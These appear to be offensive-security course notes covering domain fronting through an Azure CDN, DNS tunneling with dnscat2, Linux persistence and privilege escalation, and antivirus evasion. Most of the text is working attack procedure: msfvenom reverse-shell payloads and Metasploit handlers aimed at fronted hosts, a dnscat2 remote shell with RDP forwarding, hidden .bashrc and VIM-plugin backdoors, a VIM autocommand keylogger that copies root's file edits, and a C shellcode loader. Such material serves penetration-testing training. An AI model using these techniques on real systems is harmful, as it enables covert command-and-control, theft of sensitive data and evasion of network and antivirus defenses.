=> If `www.example2.com` is a blocked domain, but `www.example1.com` is not, make an HTTPS connection to a server and set the SNI to indicate that we are accessing `www.example1.com`. Once the TLS session is established and we start the HTTP session (over TLS), we can specify a different domain name in the Host header, for example `www.example2.com`. This will cause the webserver to serve content for that website instead. If our target is not performing HTTPS inspection, it will only see the initial connection to `www.example1.com`, unaware that we were connecting to `www.example2.com`.

On a larger scale, a CDN provides geographically-optimized web content delivery. CDN endpoints cache and serve the actual website content from multiple sources, and the HTTP request Host header is used to differentiate this content. It can serve us any resource (typically a website) that is being hosted on the same CDN network.

E.g., `www.example.com` will point to the CDN endpoint's domain name (e.g.: `something.azureedge.net`) through DNS Canonical Name (CNAME) records. When a client looks up `www.example.com`, the DNS will recursively lookup `something.azureedge.net`, which will be resolved by Azure. 

=> Traffic will be directed to the CDN endpoint rather than the real server. Since CDN endpoints are used to serve content from multiple websites, the returned content is based on the Host header.

E.g., A CDN network that is caching content for `good.com`. This endpoint has a domain name of `cdn1111.someprovider.com`.

We'll create a CDN endpoint that is proxying or caching content to `malicious.com`. This new endpoint will have a domain name of `cdn2222.someprovider.com`, which means if we browse to this address, we eventually access `malicious.com`.

Assuming that `malicious.com` is a blocked domain and `good.com` is an allowed domain, we could then subversively access `malicious.com`.

1. The client initiates a DNS request to its primary DNS server to look up the IP of `good.com`.
2. The primary DNS server asks the root DNS server for the IP address of `good.com`.
3. The server replies with the configured **CNAME record** for that domain, which is `cdn1111.someprovider.com`.
4. The primary DNS server queries the `someprovider.com` DNS server for the `cdn1111.someprovider.com` domain.
5. The DNS server for `someprovider.com` replies with 192.168.1.1, which is the IP of the CDN endpoint.
6. The primary DNS sends the reply to the client.
7. The client initiates a TLS session to domain `good.com` to the CDN endpoint.
8. The CDN endpoint serves the certificate for `good.com`.
9. The client asks for the `cdn2222.someprovider.com` resource.
10. The CDN endpoint serves the contents of `malicious.com`.

If we are using HTTPS and no inspection devices are present, this primarily appears to be a connection to `good.com` because of the initial DNS request and the SNI entry from the TLS Client Hello.

Even in an environment that uses HTTPS filtering, we can use this technique to **bypass DNS filters**.

Some CDN providers, like Google and Amazon, will **block requests if the host in the SNI and the Host headers don't match** => Microsoft Azure.

### Domain Fronting with Azure CDN

Host a Meterpreter listener on our `meterpreter.info` domain.

Set up a CDN in Azure to proxy requests to this domain

* Resource group: The CDN profile must belong to a resource group. We can either select an existing one or create a new one. E.g., offsecdomainfront-rg
* RG location: An arbitrary geographic area where we want to host the CDN.
* Pricing tier: select "Standard Verizon". This affects not only the pricing, but also the features we will have access to, and will also affect the way the CDN works. The "Standard Microsoft" tier creates issues with TLS and the caching is also not as flexible.
* CDN endpoint name: The hostname we will use in the HTTP header to access `meterpreter.info`. This can be anything that is available from Azure, e.g., `offensive-security` and the **suffix** will be `azureedge.net`.
* Origin type: This should be set to "Custom origin".
* Origin hostname: This would be the actual website that should be cached by CDN under normal cases. This is the domain where we host our C2 server `meterpreter.info`

Caching will break our C2 channel, especially our reverse shells since they are not static and each request returns a unique response.

To disable caching, select our Endpoint and **Caching rules** > set **Caching behavior** to "Bypass cache", which will disable caching.

Also set **Query string caching behavior** to "Bypass caching for query strings", which will prevent the CDN from caching any requests containing query strings.

On our machine, which is the destination for `meterpreter.info`, set up a simple Python HTTP and HTTPS listener to test web server functionality

```bash
python3 -m http.server 80
```

`python3 httpsserver.py`

```python
from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl
import socketserver

httpd = socketserver.TCPServer(('138.68.99.177', 443), SimpleHTTPRequestHandler)

httpd.socket = ssl.wrap_socket(httpd.socket, 
        keyfile="key.pem", 
        certfile='cert.pem', server_side=True)

httpd.serve_forever()
```

```bash
curl http://offensive-security.azureedge.net
curl -k https://offensive-security.azureedge.net
```

```bash
git clone https://github.com/rvrsh3ll/FindFrontableDomains
cd FindFrontableDomains/
sudo ./setup.sh
```

Find a frontable domain

```bash
python3 FindFrontableDomains.py --domain outlook.com
```

The output reveals `assets.outlook.com`, is frontable.

Test the viability of the domain

```bash
curl --header "Host: offensive-security.azureedge.net" http://assets.outlook.com
```

This returns a blank response because the CDN used by the `assets.outlook.com` domain is in a **different region or pricing tier**.

```bash
python3 FindFrontableDomains.py --domain skype.com
```

Test the viability of the domain `do.skype.com`

```bash
curl --header "Host: offensive-security.azureedge.net" http://do.skype.com
curl --header "Host: offensive-security.azureedge.net" https://do.skype.com
```

Meterpreter agent

```bash
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=do.skype.com LPORT=80 HttpHostHeader=offensive-security.azureedge.net -f exe > http-df.exe
```

Meterpreter listener

```
use exploit/multi/handler
set LHOST do.skype.com
set OverrideLHOST do.skype.com
set OverrideRequestHost true
set HttpHostHeader offensive-security.azureedge.net
run -j
```

If our target environment is not using HTTPS inspection, our HTTPS traffic will not only be hidden but it will appear to be directed to `do.skype.com`. Since many organizations use Skype for meetings, this traffic will be considered legitimate. This allows us to bypass domain, proxy, and IDS filters in one shot.

Censys is a search engine similar to Shodan, searching Internet-connected devices based on their fingerprint information, like webserver type, certificate details, etc. Use this service to find Azure domain-frontable sites.

### Domain Fronting in the Lab

Use the trusted `good.com` domain to reach the otherwise blocked `bad.com` domain. Our CDN hostname will be `cdn123.offseccdn.com`, which will point to the IP address of `bad.com`.

Windows > Ubuntu (Snort IPS v2.9.7 + dnsmasq (DNS) + NGINX web server) > Internet (Kali)

#### On Windows machine:

DNS Server of the Windows machine is the Ubuntu machine

#### On Ubuntu machine:

`/etc/hosts`
```
<Ubuntu IP>     good.com
<Kali IP>       bad.com
<Ubuntu IP>     cdn123.offseccdn.com
```

```bash
sudo systemctl restart dnsmasq
sudo systemctl restart nginx
```

NGINX server is serving content for `good.com`, which is a safe domain, the traffic destined for it will be allowed through.

`/etc/nginx/sites-available/good.com`
```
server {
  listen 443 ssl;
  server_name good.com;
  ssl_certificate     good.crt;
  ssl_certificate_key good.key;
  location / {
            root /var/www/good.com;
  }
}
```

The `bad.com` domain is blocked by Snort, which will drop all DNS queries using this snort rule (`/etc/snort/rules/local.rules`):

`drop udp any any -> any 53 (msg:"VIRUS DNS query for malicious bad.com domain"; content:"|01|"; offset:2; depth:1; content:"|00 01 00 00 00 00 00|"; distance:1; within:7; content:"|03|bad|03|com"; fast_pattern; classtype:bad-unknown; sid:2013482; rev:4;)`

`cdn123.offseccdn.com` represents a CDN endpoint that is serving content for `bad.com`.

To represent a CDN network, we configured NGINX as a **reverse proxy** for this domain so it forwards all requests to the `bad.com` domain.

The configuration file related to this domain `/etc/nginx/sites-available/cdn123.offseccdn.com`:

```
server {
  listen 443 ssl;
  server_name cdn123.offseccdn.com;
  ssl_certificate     cdn.crt;
  ssl_certificate_key cdn.key;

  location / {
         proxy_pass https://bad.com
         proxy_ssl_verify off;
   }
}
```

Since we are using self-signed certificates, we also need to set **proxy_ssl_verify** to "off".

Connect to the trusted `good.com` domain and use the `cdn123.offseccdn.com` domain in the HTTP Host header to access the domain `bad.com`. As both of these domains are served from the same machine (Ubuntu), the request will be forwarded to our Kali machine.

#### On Kali machine:

Ccreate our reverse HTTPS Meterpreter shell, where we set `good.com` as the LHOST and `cdn123.offseccdn.com` as the HttpHostHeader.

```bash
msfvenom -p windows/x64/meterpreter_reverse_https HttpHostHeader=cdn123.offseccdn.com LHOST=good.com LPORT=443 -f exe > https-df.exe
```

Configure a listener to handle this shell. Note that we will use a **stageless** payload, so we don't need to configure the **OverrideLHOST** and **OverrideRequestHost** options.

```bash
msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_https;set HttpHostHeader cdn123.offseccdn.com; set LHOST good.com;set LPORT 443;run;"
```

## DNS Tunneling

In order to receive the DNS requests generated by the client, we need to register our DNS server as the **authoritative server** for a given target domain, i.e. to assign an **NS record** to our domain.

=> We must purchase a domain and under its configuration, and set the **NS record** to our DNS tunnel server. This will cause the DNS server to forward all subdomain requests to our server.

From the **client**, we can encapsulate data into the name field, which contains the domain name. However, since the top-level domain is fixed, we can only encapsulate data as **subdomains**. These can be up to **63 characters long** but the total length of a domain can't exceed 253 characters.

From the **server** side, we can return data in a variety of fields based on the record type that was requested. An "A" record can only contain IPv4 addresses, => only store 4 bytes of information, but "TXT" records allow up to 64k.

Clients will continuously poll the server for new commands because the server can't initiate connections to the client. The client will execute new commands and send the results via new query messages. Within these exchanges, we will generally **hex-encode** our data, which allows us to transfer custom data.

E.g., Client polls the server via DNS TXT queries

`Query: Request TXT record for "61726574686572656e6577636f6d6d616e6473.ourdomain.com"`

represents the hex-encoded string of "aretherenewcommands".
* If there is nothing to run, the server will return an empty TXT record.
* If there are commands to execute, the server will return the hex-encoded string of the command to be executed by the client.

E.g., The "hostname" command: `TXT: "686f73746e616d65"`

Next, the client executes the command and captures the results. To send the results, it will generate a new DNS lookup that includes the output of the requested command. In this case, the response would include the hex-encoded hostname ("client") in the request. E.g., "636c69656e74.ourdomain.com" The client could safely use a single "A" record lookup in this case due to the short response. If the response was longer, the client would use multiple DNS queries.

Proper tunneling tools account for various issues such as **DNS retransmission**, in which the client resends queries because it didn't receive an answer in time, or **DNS caching**, in which the client caches the result of DNS queries. Full-featured tools can potentially tunnel arbitrary TCP/IP traffic and can also encrypt data.

### DNS Tunneling with dnscat2

Windows > Ubuntu > Kali

#### On Ubuntu machine:

Ubuntu machine will act as the **primary DNS server**. All subdomain lookup requests for a specific domain should go to our DNS tunneling server (our Kali machine), which acts as the authoritative name server for that domain.

We'll use a simple dnsmasq DNS server and configure it to forward requests. We'll use `tunnel.com` as an example domain.

Edit the `/etc/dnsmasq.conf` file on the Ubuntu machine 

```
server=/tunnel.com/<Kali IP>
server=/somedomain.com/<Kali IP>
```

```bash
sudo systemctl restart dnsmasq
```

#### On Kali machine:

```bash
sudo apt install dnscat2

dnscat2-server tunnel.com
```

#### On Windows machine:

```bat
dnscat2-v0.07-client-win32.exe tunnel.com
```

On Kali machine:

```
dnscat2> session -i 1
command (client) 1> shell
command (client) 1> session -i 2
cmd.exe (client) 2> whoami
Ctrl + Z
```

Redirecting our local port 3389 to the Windows machine's IP

```
command (client) 1> listen 127.0.0.1:3389 172.16.51.21:3389
```

# Linux Post-Exploitation

## User Configuration Files

`.bash_profile` is executed when logging in to the system initially. This happens when logging in to the machine itself, via a serial console or SSH.

`.bashrc` is executed when a new terminal window is opened from an existing login session or when a new shell instance is started from an existing login session.

=> Modify `.bash_profile` or `.bashrc` to set environment variables or **load scripts** when a user initially logs in to a system.

=> Maintain persistence, escalate privileges, or engage in other offensive activity.

```bash
echo "touch /tmp/bashtest.txt" >> ~/.bashrc
```

### VIM Config Simple Backdoor

To print a message to the user, use the following command in the `.vimrc` file or within the editor

`:echo "this is a test"`

Since VIM has access to the shell environment's variables, we can use $USER to get the username or $UID to get the user's ID number.

The commands specified in the `.vimrc` file are executed when VIM is launched. By editing this file, we can cause a user's VIM session to perform unintended actions on their behalf when VIM is run.

To run **shell commands** from within the config file

`!touch /tmp/test.txt`

By default, VIM allows shell commands but some hardened environments have VIM configured to restrict them. 

Calling VIM with the `-Z` parameter on the command line, then attempting to run a shell command will result in an error message indicating that such commands are not allowed.

Putting our commands directly into the user's `.vimrc` file isn't particularly stealthy, as a user modifying their own settings may accidentally discover the changes we've made.

=> "Source" a shell script using the bash `source` command. This loads a specified shell script and runs it.

"Import" other VIM configuration files into the user's current config with the `:source` command.

Note that the source call for loading a VIM configuration file is prepended with a **colon** and not an **exclamation point**, which is used for shell commands.

As a more stealthy approach, leverage the **VIM plugin directory**. As long as the files have a `.vim` extension, all VIM config files located in the user's `~/.vim/plugin` directory will be loaded when VIM is run.

The `:silent` command mutes any debug output which would normally be sent to the user when running VIM.

`.vimrc` file

`:silent !source ~/.vimrunscript`


`/home/offsec/.vimrunscript` file

```
#!/bin/bash
echo "hacked" > /tmp/hacksrcout.txt
```

We can gain root privileges if the user runs VIM as root or uses the `visudo` command

VIM handles its configuration files differently for a user in a sudo context depending on the distribution of Linux.
* On a Ubuntu or Red Hat: VIM will use the current user's `.vimrc` configuration file even in a sudo context.
* On a Debian: In a sudo context, VIM will use the root user's VIM configuration.

On a Debian or similar system that does not persist the user's shell environment information when moving to a sudo context, we can add an alias to the user's `.bashrc` file.

`alias sudo="sudo -E"`

Replaces a standard sudo call with one that will force sudo to persist the user's VIM settings. The shell script being loaded will then also run as root. We will need to source our `.bashrc` file from the command line if we want the alias changes to go into effect right away.

```bash
source ~/.bashrc
```

In some cases, users are given limited sudo rights to run only specific programs. 

```bash
sudo -l
```

`(root) NOPASSWD: /usr/bin/vim /opt/important.conf`

This limited access can be set in the `/etc/sudoers` file with the same syntax as the highlighted line above. In this case, a password is not required for sudo access.

We can run VIM and then enter `:shell` to gain a root shell automatically. If a password was required, use the alias vector to gain root access with our backdoor script.

Note: many administrators now require the use of `sudoedit` for modifying sensitive files. This process makes copies of the files for the user to edit and then uses `sudo` to overwrite the old files. It also prevents the editor itself from running as sudo.

### VIM Config Simple Keylogger

Create a keylogger to log any changes a user makes to a file. => for capturing sensitive data in configuration files or scripts.

`autocommand` settings are internal to VIM and do not require the shell (even if the current system uses a restricted VIM environment that blocks any shell commands).

Use `:autocmd` in a VIM configuration file or in the editor to set actions for a collection of predefined events.

E.g., VimEnter (entering VIM), VimLeave (leaving VIM), FileAppendPre (right before appending to a file), and BufWritePost (after writing a change buffer to a file).

We don't want to risk preventing the user from actually saving their files as this might alert them. To avoid this, we can perform our actions based on the BufWritePost event. This activates once a buffer has already been written to the intended file.

```
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```

VIM supports the use of basic if statements in its configuration scripts in this manner.

```
:if <some condition>
:<some command>
:else
:<some alternative command>
:endif
```

Combining this with the ability to use environment variables, we can check whether the user is running as root.

The "*" specifies that this action will be performed for all files being edited. We could change this to match only files with a particular name or file extension.

We then use :w! to save the buffer contents.

Put our command in `/home/offsec/.vim/plugin/settings.vim`.

It's also possible to run shell commands on an autocommand trigger. Just replace everything after ":silent" with "!" followed by a shell script name or shell command. Note that in our current restricted environment, we can't use this approach.

## Bypassing AV

Turn Kaspersky off 

```bash
sudo kesl-control --stop-t 1
```

Decrypts the encrypted version of the EICAR file 

```bash
sudo gpg -d eicar.txt.gpg > eicar.txt
```

Run a scan on our EICAR test file

```bash
sudo kesl-control --scan-file ./eicar.txt
```

Query Kaspersky's event log

```bash
sudo kesl-control -E --query | grep DetectName
```

A 64-bit Meterpreter payload encoded with the x64/zutto_dekiru encoder is not detected by the AV.

Restore real-time protection 

```bash
sudo kesl-control --start-t 1
```

Generate a 64-bit unencoded shellcode with msfvenom, with an output type of "c", then insert it in a C program, which will act as a wrapper to load and run the shellcode.

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
...
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

int main (int argc, char **argv) 
{
    // Run our shellcode
    int (*ret)() = (int(*)())buf;
    ret();
}
```

```bash
gcc -o hack.out hack.c -z execstack
./hack.out
```